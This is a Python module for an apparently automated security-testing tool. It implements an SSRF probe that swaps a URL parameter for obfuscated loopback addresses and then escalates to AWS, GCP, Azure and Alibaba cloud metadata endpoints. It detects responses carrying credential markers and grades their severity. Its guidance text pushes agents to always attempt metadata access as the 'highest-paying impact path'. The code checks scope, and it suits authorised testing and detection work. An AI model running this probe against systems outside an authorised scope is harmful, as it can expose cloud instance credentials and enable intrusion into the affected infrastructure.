"""SkillSsrf — Server-Side Request Forgery probe with cloud-metadata impact.

Workflow:
  1. Issue a baseline GET with the user-supplied URL value (or a benign
     reachable host) so we can compare response shape later.
  2. For each loopback variant in `_payloads.SSRF_LOOPBACK_VARIANTS`,
     substitute the param value with `http://<variant>` and probe.
  3. Where a loopback hit succeeds, escalate to cloud metadata
     endpoints (`SSRF_METADATA_TARGETS`). Reaching metadata is critical impact.

Severity grading (impact-driven, not detection-driven):
  - critical : metadata endpoint returned 200 with cloud-specific markers
  - high     : loopback variant returned a response substantively different
               from baseline (suggests internal address reachable)
  - medium   : SSRF parser confusion accepted but no useful internal access
  - info     : no behavior change vs baseline
"""
from __future__ import annotations
import hashlib, re
from typing import Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

import requests

from services.skills.base import Skill, SkillResult, register
from services.skills._payloads import (
    SSRF_LOOPBACK_VARIANTS,
    SSRF_METADATA_TARGETS,
)


_HEADERS = {"User-Agent": "Mozilla/5.0 ZeekGlare-Arena-SSRF"}
_METADATA_MARKERS = (
    "ami-id", "instance-id", "iam/security-credentials",  # AWS
    "computeMetadata", "Metadata-Flavor",                   # GCP
    "compute/azEnvironment", "subscriptionId",              # Azure
    "ram/security-credentials",                             # Alibaba
)


def _hash(s: str) -> str:
    return hashlib.sha1((s or "").encode("utf-8", "replace")).hexdigest()[:12]


def _swap_param(url: str, param: str, new_value: str) -> str:
    """Swap a query param value while keeping the rest of the URL intact."""
    p = urlparse(url)
    qs = parse_qsl(p.query, keep_blank_values=True)
    qs = [(k, new_value if k == param else v) for k, v in qs]
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(qs), p.fragment))


@register
class SkillSsrf(Skill):
    name        = "skill_ssrf"
    danger      = "active"
    description = (
        "Probe a URL+param for Server-Side Request Forgery. Substitutes the "
        "param value with loopback variants (decimal/octal/hex/IPv6 of 127.0.0.1, "
        "short forms like 127.1) to detect parser-bypass SSRF, then escalates to "
        "cloud metadata endpoints (AWS IMDS, GCP, Azure, Alibaba) where loopback "
        "succeeded. Reports IMPACT severity: critical if metadata reached, high if "
        "internal loopback reachable, medium if parser confusion only."
    )
    guidance    = (
        "SSRF impact is everything. A 'detected SSRF' that can't reach anything is "
        "info-tier; one that reads cloud creds is critical. After detection, always "
        "test metadata targets — they're the highest-paying impact path."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "url":   {"type": "string", "description": "URL with the URL-accepting param. Must be in scope."},
            "param": {"type": "string", "description": "Name of the param that takes a URL (e.g. 'url', 'redirect', 'image_src')."},
            "skip_metadata": {"type": "boolean", "default": False,
                              "description": "Skip cloud metadata escalation (useful when you only want loopback detection)."},
        },
        "required": ["url", "param"],
    }

    @classmethod
    def applicable(cls, state) -> bool:
        c = state.asset_counts()
        return c.get("url", 0) > 0 or c.get("param", 0) > 0

    @classmethod
    def dedup_key(cls, args) -> Optional[tuple[str, str, str, str]]:
        return (args.get("url", ""), args.get("param", ""), "ssrf", "loopback+metadata")

    @classmethod
    def run(cls, args, state, agent_id) -> SkillResult:
        url   = (args.get("url") or "").strip()
        param = (args.get("param") or "").strip()
        skip_meta = bool(args.get("skip_metadata"))
        if not url or not param:
            return SkillResult(ok=False, error="url and param required")
        if not state.in_scope(url):
            return SkillResult(ok=False, error=f"out of scope: {url}")

        def _fetch(target_url):
            try:
                r = requests.get(target_url, headers=_HEADERS, timeout=10,
                                 allow_redirects=False, verify=False)
                body = r.text or ""
                return {
                    "url":       target_url,
                    "status":    r.status_code,
                    "length":    len(r.content or b""),
                    "body_hash": _hash(body),
                    "body_preview": body[:500],
                }
            except Exception as e:
                return {"url": target_url, "error": f"{type(e).__name__}: {e}"}

        # Baseline — use a benign external host so we can spot internal-reachable diffs.
        baseline_value = "http://example.com"
        baseline = _fetch(_swap_param(url, param, baseline_value))
        if baseline.get("error"):
            return SkillResult(ok=False, error=f"baseline failed: {baseline['error']}")

        loopback_hits = []
        for variant in SSRF_LOOPBACK_VARIANTS:
            probe_url = _swap_param(url, param, f"http://{variant}/")
            r = _fetch(probe_url)
            if r.get("error"):
                continue
            # "Hit" — different body hash AND status differs OR length deviates >100B
            if (r["body_hash"] != baseline["body_hash"]
                and (r["status"] != baseline["status"]
                     or abs(r["length"] - baseline["length"]) > 100)):
                loopback_hits.append({**r, "variant": variant})

        # Metadata escalation only if at least one loopback variant worked.
        metadata_hits = []
        if loopback_hits and not skip_meta:
            for meta_target in SSRF_METADATA_TARGETS:
                probe_url = _swap_param(url, param, meta_target)
                # AWS IMDSv2 needs token header, but agents will see if v1 is open.
                headers = dict(_HEADERS)
                if "metadata.google.internal" in meta_target:
                    headers["Metadata-Flavor"] = "Google"
                try:
                    r = requests.get(probe_url, headers=headers, timeout=8,
                                     allow_redirects=False, verify=False)
                    body = r.text or ""
                    if 200 <= r.status_code < 300 and any(m in body for m in _METADATA_MARKERS):
                        metadata_hits.append({
                            "metadata_target": meta_target,
                            "status": r.status_code,
                            "length": len(r.content or b""),
                            "body_preview": body[:400],
                        })
                except Exception:
                    continue

        # ── Severity grading by impact achieved ──────────────────────────────
        if metadata_hits:
            severity = "critical"
            description = (
                f"SSRF reaches cloud metadata service via {param}=. "
                f"{len(metadata_hits)} metadata endpoint(s) returned cloud-specific markers — "
                "this is direct impact (potential credential disclosure)."
            )
            ev_lines = [f"Baseline ({baseline_value}): HTTP {baseline['status']} {baseline['length']}B"]
            for h in metadata_hits[:3]:
                ev_lines.append(f"METADATA: {h['metadata_target']} → HTTP {h['status']} {h['length']}B")
                ev_lines.append(f"  preview: {h['body_preview'][:200]!r}")
            evidence = "\n".join(ev_lines)
        elif loopback_hits:
            severity = "high"
            description = (
                f"SSRF reaches loopback via {param}=. {len(loopback_hits)} loopback variant(s) "
                "returned responses substantively different from baseline, suggesting the server "
                "is making the outbound request and reaching its own internal address space."
            )
            ev_lines = [f"Baseline (external): HTTP {baseline['status']} {baseline['length']}B"]
            for h in loopback_hits[:5]:
                ev_lines.append(f"loopback {h['variant']}: HTTP {h['status']} {h['length']}B")
            evidence = "\n".join(ev_lines)
        else:
            return SkillResult(
                ok=True,
                summary=f"No SSRF detected on {param}= ({len(SSRF_LOOPBACK_VARIANTS)} variants tried).",
                extras={"baseline": baseline, "probes_attempted": len(SSRF_LOOPBACK_VARIANTS)},
            )

        return SkillResult(
            ok=True,
            summary=f"SSRF confirmed ({severity}): {len(loopback_hits)} loopback hits, {len(metadata_hits)} metadata hits.",
            evidence=evidence,
            finding={
                "vuln_type":   "ssrf",
                "severity":    severity,
                "target":      url,
                "location":    f"{url} param={param}",
                "description": description,
                "evidence":    evidence,
            },
            extras={
                "baseline":      baseline,
                "loopback_hits": loopback_hits,
                "metadata_hits": metadata_hits,
            },
        )
